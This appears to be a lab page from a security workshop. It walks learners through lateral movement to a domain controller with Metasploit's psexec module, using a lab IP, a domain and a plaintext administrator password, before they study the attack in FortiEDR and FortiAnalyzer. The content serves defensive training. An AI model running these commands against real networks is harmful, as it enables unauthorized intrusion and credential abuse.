---
title: Using Metasploit
menuTitle: Lateral Movement
weight: 10
---
Please follow along as the instructor walks through a live attack scenario in which a user is the target of social engineering. In this scenario the user downloads a file that leads to initial access into an active directory environment. 

As the scenario progresses be mindful of various tactics and techniques that are documented in the MITRE ATT&CK framework. Subsequently, we'll spend time investing this attack within the FortiEDR and FortiAnalyzer to understand how these attacks look from a defender's perspective.

## Lateral Movement

After initial compromise of a domain workstation the instructor will laterally move to the Domain Controller. If you'd like to replicate this in your lab environment the following steps can be taken from Meterpreter:
1. Press `Ctrl + Z` to send the current session to the background
2. We will use the windows/smb/psexec module. This module uses a valid administrator username and password (or password hash) to execute an arbitrary payload. This module is similar to the "psexec" utility provided by SysInternals. This will automatically run a Powershell command if the target detects Powershell on the machine:
    - `use exploit/windows/smb/psexec`
3. Set the target to the IP address of the domain controller that was discovered during initial compromise:
    - `set rhost 192.168.157.142`
4. Set target domain
    - `set SMBDomain LOST.local`
5. Set gathered admin credentials
    - `set SMBUser administrator`
    - `set SMBPass P@$$w0rd!`
6. Configure sessions information
    - `set SESSION 2`
7. Launch exploit
    - `exploit -j`
